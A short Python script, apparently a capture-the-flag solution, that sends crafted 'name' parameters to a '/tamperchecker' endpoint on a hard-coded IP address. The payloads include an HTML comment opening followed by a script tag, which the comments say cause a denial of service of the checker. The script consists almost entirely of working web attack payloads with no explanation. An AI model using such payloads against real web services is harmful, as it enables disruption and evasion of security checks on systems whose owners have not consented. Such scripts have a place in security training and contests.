import requests

url = "http://118.27.104.46:31416"
response = requests.post(url + "/tamperchecker", data={"url":f"{url}/?name=alert"})
print(response.text)#alert
response = requests.post(url + "/tamperchecker", data={"url":f"{url}/?name=<!--<script>"})
print(response.text)#DoS